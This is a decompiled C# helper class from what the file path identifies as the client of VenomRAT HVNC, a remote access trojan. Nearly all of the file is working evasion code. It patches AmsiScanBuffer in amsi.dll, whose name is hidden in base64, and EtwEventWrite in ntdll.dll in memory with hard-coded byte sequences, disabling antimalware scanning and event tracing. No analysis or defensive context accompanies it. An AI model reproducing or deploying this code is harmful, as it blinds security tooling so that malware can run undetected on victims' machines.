﻿// Decompiled with JetBrains decompiler
// Type: Client.Helper.A
// Assembly: Client, Version=5.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: AF1838BC-6B25-40E4-9339-7F493AC3654D
// Assembly location: C:\Users\Younn\RiderProjects\VenomRAT_HVNC-5.0.4.0\VenomRAT_HVNC\bin\Debug\Client.exe

using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;


namespace Client.Helper
{
  public class A
  {
    private static byte[] x64_etw_patch = new byte[4]
    {
      (byte) 72,
      (byte) 51,
      (byte) 192,
      (byte) 195
    };
    private static byte[] x86_etw_patch = new byte[5]
    {
      (byte) 51,
      (byte) 192,
      (byte) 194,
      (byte) 20,
      (byte) 0
    };
    private static byte[] x64_am_si_patch = new byte[6]
    {
      (byte) 184,
      (byte) 87,
      (byte) 0,
      (byte) 7,
      (byte) 128,
      (byte) 195
    };
    private static byte[] x86_am_si_patch = new byte[8]
    {
      (byte) 184,
      (byte) 87,
      (byte) 0,
      (byte) 7,
      (byte) 128,
      (byte) 194,
      (byte) 24,
      (byte) 0
    };

    private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
    {
      IntPtr num1 = IntPtr.Zero;
      try
      {
        int num2 = Marshal.ReadInt32((IntPtr) (ModuleBase.ToInt64() + 60L));
        int num3 = (int) Marshal.ReadInt16((IntPtr) (ModuleBase.ToInt64() + (long) num2 + 20L));
        long ptr = ModuleBase.ToInt64() + (long) num2 + 24L;
        int num4 = Marshal.ReadInt32((IntPtr) (Marshal.ReadInt16((IntPtr) ptr) != (short) 267 ? ptr + 112L : ptr + 96L));
        int num5 = Marshal.ReadInt32((IntPtr) (ModuleBase.ToInt64() + (long) num4 + 16L));
        Marshal.ReadInt32((IntPtr) (ModuleBase.ToInt64() + (long) num4 + 20L));
        int num6 = Marshal.ReadInt32((IntPtr) (ModuleBase.ToInt64() + (long) num4 + 24L));
        int num7 = Marshal.ReadInt32((IntPtr) (ModuleBase.ToInt64() + (long) num4 + 28L));
        int num8 = Marshal.ReadInt32((IntPtr) (ModuleBase.ToInt64() + (long) num4 + 32L));
        int num9 = Marshal.ReadInt32((IntPtr) (ModuleBase.ToInt64() + (long) num4 + 36L));
        for (int index = 0; index < num6; ++index)
        {
          if (Marshal.PtrToStringAnsi((IntPtr) (ModuleBase.ToInt64() + (long) Marshal.ReadInt32((IntPtr) (ModuleBase.ToInt64() + (long) num8 + (long) (index * 4))))).Equals(ExportName, StringComparison.OrdinalIgnoreCase))
          {
            int num10 = (int) Marshal.ReadInt16((IntPtr) (ModuleBase.ToInt64() + (long) num9 + (long) (index * 2))) + num5;
            int num11 = Marshal.ReadInt32((IntPtr) (ModuleBase.ToInt64() + (long) num7 + (long) (4 * (num10 - num5))));
            num1 = (IntPtr) ((long) ModuleBase + (long) num11);
            break;
          }
        }
      }
      catch
      {
        throw new InvalidOperationException("Failed to parse module exports.");
      }
      return !(num1 == IntPtr.Zero) ? num1 : throw new MissingMethodException(ExportName + " not found.");
    }

    private static string decode(string b64encoded)
    {
      return Encoding.ASCII.GetString(Convert.FromBase64String(b64encoded));
    }

    private static void PatchMem(byte[] patch, string library, string function)
    {
      try
      {
        IntPtr ProcessHandle = new IntPtr(-1);
        IntPtr exportAddress = A.GetExportAddress(Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where<ProcessModule>((Func<ProcessModule, bool>) (x => library.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))).FirstOrDefault<ProcessModule>().BaseAddress, function);
        IntPtr num1 = new IntPtr(patch.Length);
        uint num2 = 0;
        ref IntPtr local1 = ref exportAddress;
        ref IntPtr local2 = ref num1;
        ref uint local3 = ref num2;
        DInvokeCore.NtProtectVirtualMemory(ProcessHandle, ref local1, ref local2, 64U, ref local3);
        Marshal.Copy(patch, 0, exportAddress, patch.Length);
      }
      catch (Exception ex)
      {
        Console.WriteLine(" [!] {0}", (object) ex.Message);
        Console.WriteLine(" [!] {0}", (object) ex.InnerException);
      }
    }

    private static void Patcham_si(byte[] patch)
    {
      string library = A.decode("YW1zaS5kbGw=");
      foreach (ProcessModule module in (ReadOnlyCollectionBase) Process.GetCurrentProcess().Modules)
      {
        if (module.ModuleName == library)
          A.PatchMem(patch, library, "AmsiScanBuffer");
      }
    }

    private static void PatchETW(byte[] Patch) => A.PatchMem(Patch, "ntdll.dll", "EtwEventWrite");

    public static void B()
    {
      if (IntPtr.Size != 4)
      {
        A.Patcham_si(A.x64_am_si_patch);
        A.PatchETW(A.x64_etw_patch);
      }
      else
      {
        A.Patcham_si(A.x86_am_si_patch);
        A.PatchETW(A.x86_etw_patch);
      }
    }
  }
}
